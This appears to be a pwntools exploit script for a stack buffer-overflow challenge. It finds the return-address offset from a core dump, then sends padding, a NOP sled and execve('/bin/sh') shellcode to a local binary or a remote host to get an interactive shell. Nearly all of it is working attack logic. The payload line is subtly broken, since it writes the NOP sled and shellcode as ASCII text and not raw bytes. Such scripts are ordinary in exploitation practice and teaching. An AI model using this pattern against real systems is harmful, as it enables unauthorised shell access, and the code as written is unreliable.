from pwn import *

binary = "./shellcode"

p = ELF(binary)

io = process([binary])
io.sendline(cyclic(128))
io.wait()

core = Coredump("/tmp/core.%s" % io.pid)
#core = Coredump("/tmp/core")
info("eip = %#x", core.eip)
offset = cyclic_find(core.eip)
info("rip offset is = %d", offset)

#shell = p.functions['shell'].address
#info("Shell address : %hx",shell)
#payload = b'A'*20+p32(0x31c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05)
payload = b'A'*offset+"0x90"*200+b"0x31c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05"

#payload = b'A'*20+p32(0x080491b6)

info("Payload:\n"+hexdump(payload))

if args['REMOTE']:
	io = remote(args['REMOTE'],50001)
else:
	io = p.process()
	#io = p.debug()
io.sendline(payload)
io.interactive()
